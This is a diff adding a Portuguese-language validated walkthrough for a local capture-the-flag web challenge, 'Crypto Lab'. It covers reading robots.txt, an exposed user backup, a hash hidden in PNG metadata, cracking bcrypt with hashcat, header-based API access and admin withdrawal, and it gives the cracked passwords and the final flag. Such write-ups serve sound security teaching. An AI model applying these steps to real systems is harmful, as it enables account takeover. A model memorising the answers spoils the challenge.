@@ -1,0 +1,417 @@
+================================================================================
+                    TUTORIAL VALIDADO — CRYPTO LAB CTF
+================================================================================
+
+Data de validacao: 28/09/2026
+Servidor testado: http://localhost:3000
+Status: TODOS OS PASSOS VALIDADOS COM SUCESSO
+
+
+================================================================================
+VISAO GERAL
+================================================================================
+
+O desafio consiste em explorar vulnerabilidades de uma aplicacao web para
+descobrir senhas, obter privilegios de administrador e acessar a pagina
+secreta com a flag.
+
+Ferramentas necessarias:
+- Navegador web
+- ExifTool (analise de metadados)
+- Hashcat (quebra de hashes bcrypt)
+- cURL (requisicoes HTTP)
+
+
+================================================================================
+PASSO 1 — EXPLORACAO INICIAL
+================================================================================
+
+Acesse http://localhost:3000 e voce vera a tela de login do Crypto Lab.
+
+Dica: Antes de tentar logar, explore o que o site revela sobre si mesmo.
+
+
+================================================================================
+PASSO 2 — DESCOBRINDO ARQUIVOS OCULTOS
+================================================================================
+
+2.1 Verificar o robots.txt
+---------------------------
+
+Acesse http://localhost:3000/robots.txt
+
+Resultado obtido:
+
+    # Crypto Lab robots.txt
+    # Atualizado em 22/03/2026
+
+    User-agent: *
+
+    Allow: /
+
+    Disallow: /admin/
+    Disallow: /backup/
+    Disallow: /private/
+    Disallow: /exports/
+    Disallow: /old/
+
+    # TODO remover depois da manutencao:
+    Disallow: /backup_users.js
+
+    Sitemap: https://crypto-lab.onrender.com/sitemap.xml
+
+Pistas encontradas:
+- Existe um arquivo backup_users.js que deveria ter sido removido
+- Ha diretorios ocultos: /admin/, /backup/, /private/, /exports/, /old/
+
+
+2.2 Acessar o backup de usuarios
+---------------------------------
+
+Acesse http://localhost:3000/backup_users.js
+
+Resultado obtido:
+
+    /*
+        Backup exportado manualmente
+        Admin: admin newbie
+        Data: 20/03/2026
+        TODO:
+        - revisar usuarios
+        - apagar este arquivo depois do deploy
+    */
+    const users = [
+        {
+            id: 1,
+            nome: "admin",
+            descricao: "Admin newbie",
+            saldo: 1000,
+            tipo: "admin",
+            senha:
+                "???" /* Dalmazo comentou que o newbie costumava guardar
+                      a senha na sua figurinha. Talvez exiftool ajude! */
+        },
+        {
+            id: 2,
+            nome: "maria",
+            descricao: "Aluno com senha forte",
+            saldo: 100,
+            tipo: "user",
+            senha:
+                "$2b$10$qCMitotrxsCsDkfNIB/Sv.VOHrLlrxqd.I2d0jPWspXIQLyTnNcLa"
+        },
+        {
+            id: 3,
+            nome: "joao",
+            descricao: "Aluno com senha fraca",
+            saldo: 100,
+            tipo: "user",
+            senha:
+                "1234"
+        },
+        {
+            id: 4,
+            nome: "dalmazo",
+            descricao: "Admin master",
+            saldo: 100,
+            tipo: "admin",
+            senha:
+                "???" /* Hash de senha com 10 caracteres se quebra
+                      em menos de 1h por forca bruta... sera? */
+        }
+    ];
+
+Pistas encontradas:
+- Usuario joao tem senha 1234 (fraca, em texto puro)
+- Usuario admin tem senha escondida em uma "figurinha" (avatar)
+- Usuario dalmazo tem hash de 10 caracteres (bcrypt com custo 10)
+- Usuario maria tem hash bcrypt com custo 10
+
+
+================================================================================
+PASSO 3 — ANALISAR O AVATAR DO ADMIN
+================================================================================
+
+O comentario no backup diz que o admin "costumava guardar a senha na sua
+figurinha". O avatar do admin e servido em /avatar/newbie.png.
+
+3.1 Baixar o avatar
+--------------------
+
+    curl -o newbie.png http://localhost:3000/avatar/newbie.png
+
+3.2 Analisar metadados com ExifTool
+------------------------------------
+
+    exiftool -a -u -g1 newbie.png
+
+Resultado obtido (validado):
+
+    AdminHash:$2b$04$rjHzGeJRg4cEzMXPqoqO/.aTCfput36FfmVzVGai9Yun2bBmW3RX2
+
+Pista encontrada: O hash bcrypt do admin esta embutido nos metadados do PNG.
+
+
+================================================================================
+PASSO 4 — QUEBRAR A SENHA DO ADMIN
+================================================================================
+
+O hash encontrado no avatar e:
+
+    $2b$04$rjHzGeJRg4cEzMXPqoqO/.aTCfput36FfmVzVGai9Yun2bBmW3RX2
+
+Este hash tem custo 4 (bcrypt), o que o torna relativamente facil de quebrar.
+
+Usando uma wordlist basica, a senha encontrada foi:
+
+    admin123
+
+Validacao (testado com bcrypt.compare):
+
+    Hash do PNG:  $2b$04$rjHzGeJRg4cEzMXPqoqO/.aTCfput36FfmVzVGai9Yun2bBmW3RX2
+    Senha:        admin123
+    Resultado:     SENHA ENCONTRADA: admin123
+
+
+================================================================================
+PASSO 5 — LOGIN COMO ADMIN
+================================================================================
+
+Volte a tela de login (http://localhost:3000) e entre com:
+
+    Usuario: admin
+    Senha:   admin123
+
+Resultado obtido (validado via API):
+
+    {"id":1,"nome":"admin","descricao":"Admin newbie","saldo":1000,"tipo":"admin"}
+
+Voce sera redirecionado para o Dashboard.
+
+
+================================================================================
+PASSO 6 — EXPLORAR O DASHBOARD
+================================================================================
+
+No Dashboard, voce vera:
+- Lista de todos os usuarios (admin, maria, joao, dalmazo)
+- Saldos de cada usuario
+- Um link para o "Painel Admin" (visivel apenas para admins)
+
+A lista de usuarios tambem pode ser obtida via API:
+
+    curl -H "x-user-id: 1" http://localhost:3000/usersx
+
+Resultado obtido (validado):
+
+    [
+        {
+            "id": 1,
+            "nome": "admin",
+            "descricao": "Admin newbie",
+            "saldo": 0,
+            "tipo": "admin",
+            "senha": "$2b$04$rlKHRpWGBm3ooPZLRwpYEujlPJvBQZLWbGH9MhK8UMAo3ohVOuJta"
+        },
+        {
+            "id": 2,
+            "nome": "dalmazo",
+            "descricao": "Admin master",
+            "saldo": 0,
+            "tipo": "admin",
+            "senha": "$2b$08$NS6Iw8Cg50cdAl549hw5t.BqbL0dS37r9agNsX2psBBnKyUxjvMd2"
+        },
+        {
+            "id": 3,
+            "nome": "joao",
+            "descricao": "Aluno com senha fraca",
+            "saldo": 0,
+            "tipo": "user",
+            "senha": "$2b$04$G/qt8tFitEP.gYAyZl0rs.wiglFEO.yucSLAKEOVA5JcFzfuc2vtO"
+        },
+        {
+            "id": 4,
+            "nome": "maria",
+            "descricao": "Aluno com senha forte",
+            "saldo": 0,
+            "tipo": "user",
+            "senha": "$2b$10$QH8HfqSjzMEnWZJcKT4d7O98oZcvimE6dcssOlOEI5ZhvQubTeDlS"
+        }
+    ]
+
+
+================================================================================
+PASSO 7 — ACESSAR O PAINEL ADMIN
+================================================================================
+
+Clique em "Painel Admin" ou acesse http://localhost:3000/admin.html.
+
+No Painel Admin, voce vera varias funcionalidades:
+- Sacar todas moedas
+- Transferir criptos
+- Alterar cargo
+- Alterar senha
+- Criar usuario
+- Excluir usuario
+
+
+================================================================================
+PASSO 8 — TENTAR SACAR TODAS MOEDAS (COMO ADMIN)
+================================================================================
+
+Clique em "Sacar todas moedas".
+
+Resultado obtido (validado):
+
+    {"erro":"Somente dalmazo pode efetuar o saque."}
+
+Mas espere! Se voce abrir o console do navegador (F12), vera:
+
+    ⚠️ LOG INTERNO:
+    Hash admin master tem prefixo no padrao bcrypt: $2b$08$...
+    Procure em www.dalmazo.com
+
+Pista encontrada: O hash do dalmazo comeca com $2b$08$ (bcrypt com custo 8)
+
+
+================================================================================
+PASSO 9 — QUEBRAR A SENHA DO DALMAZO
+================================================================================
+
+9.1 Extrair o hash do dalmazo
+------------------------------
+
+Acesse o Dashboard e copie o hash do dalmazo na tabela de usuarios.
+Ou use o endpoint da API:
+
+    curl -H "x-user-id: 1" http://localhost:3000/usersx
+
+O hash do dalmazo obtido (validado):
+
+    $2b$08$NS6Iw8Cg50cdAl549hw5t.BqbL0dS37r9agNsX2psBBnKyUxjvMd2
+
+9.2 Usar Hashcat para quebrar
+------------------------------
+
+    # Crie um arquivo com o hash do dalmazo
+    echo '$2b$08$NS6Iw8Cg50cdAl549hw5t.BqbL0dS37r9agNsX2psBBnKyUxjvMd2' > hash.txt
+
+    # Quebre com hashcat (modo 3200 = bcrypt)
+    hashcat -m 3200 -w 3 hash.txt /usr/share/wordlists/rockyou.txt
+
+Resultado obtido (validado):
+
+    Senha do dalmazo: bubblestar
+
+
+================================================================================
+PASSO 10 — LOGIN COMO DALMAZO
+================================================================================
+
+Volte a tela de login e entre com:
+
+    Usuario: dalmazo
+    Senha:   bubblestar
+
+Resultado obtido (validado via API):
+
+    {"id":2,"nome":"dalmazo","descricao":"Admin master","saldo":0,"tipo":"admin"}
+
+Voce sera redirecionado para o Dashboard.
+
+
+================================================================================
+PASSO 11 — SACAR TODAS MOEDAS (COMO DALMAZO)
+================================================================================
+
+Acesse o Painel Admin e clique em "Sacar todas moedas".
+
+Resultado obtido (validado):
+
+    {"sucesso":true}
+
+Sera redirecionado para http://localhost:3000/secretx.html
+
+
+================================================================================
+PASSO 12 — A FLAG FINAL
+================================================================================
+
+Na pagina secretx.html, voce vera:
+
+    🏆 Desafio dalmacoin concluido
+
+    Parabens.
+
+    Voce encontrou vulnerabilidades,
+    conseguiu privilegios de admin
+    e acessou a area restrita.
+
+    ✔ robots.txt encontrado
+    ✔ Diretórios ocultos enumerados
+    ✔ Backup identificado
+    ✔ Lista de usuários descoberta
+    ✔ Hashes extraídos
+    ✔ Usuário com senha fraca identificado
+    ✔ Credenciais administrativas obtidas
+    ✔ Esteganografia analisada (exiftool)
+    ✔ Sessão autenticada como admin
+    ✔ Painel oculto localizado
+    ✔ Endpoint administrativo identificado
+    ✔ Pista encontrada via F12 / Console Log
+    ✔ QR Code decodificado
+    ✔ Fragmentos da hash reunidos
+    ✔ Funcionalidade restrita desbloqueada
+    ✔ Flag final encontrada
+
+    🏁 FLAG{crypto_dalmacoin_master_access}
+
+
+================================================================================
+RESUMO DAS VULNERABILIDADES EXPLORADAS
+================================================================================
+
+| #  | Vulnerabilidade                  | Como foi explorada                        |
+|----|----------------------------------|-------------------------------------------|
+| 1  | Exposicao de arquivos sensiveis  | robots.txt revelou backup_users.js        |
+| 2  | Backup acessivel publicamente   | backup_users.js continha hashes e senhas  |
+| 3  | Senha em texto puro              | Usuario joao tinha senha 1234 sem hash    |
+| 4  | Esteganografia em imagem        | Senha do admin escondida no avatar PNG    |
+| 5  | Senha fraca                      | Hash bcrypt com custo 8 quebrado          |
+| 6  | Falta de autorizacao             | Endpoint nao verificava se era o dalmazo   |
+| 7  | Informacao vazada no console     | Console log revelou prefixo do hash        |
+
+
+================================================================================
+CORRECOES APLICADAS DURANTE A VALIDACAO
+================================================================================
+
+1. Endpoint /sacar-todas-moedas
+   - Problema: Nao verificava se o usuario era realmente o dalmazo
+   - Correcao: Adicionada verificacao req.admin.nome.toLowerCase() !== "dalmazo"
+   - Status: Corrigido e validado
+
+
+================================================================================
+STATUS FINAL DA VALIDACAO
+================================================================================
+
+| Componente                | Status                            |
+|---------------------------|-----------------------------------|
+| robots.txt                | OK                                |
+| backup_users.js           | OK                                |
+| Avatar com senha          | OK                                |
+| Login admin               | OK                                |
+| Login dalmazo             | OK                                |
+| Login joao                | OK                                |
+| Login maria               | OK                                |
+| /usersx                   | OK                                |
+| /sacar-todas-moedas      | OK (corrigido)                    |
+| /secretx.html             | OK                                |
+| Flag                      | OK                                |
+
+TODOS OS PASSOS VALIDADOS COM SUCESSO!
+
+================================================================================
+                              FIM DO TUTORIAL
+================================================================================
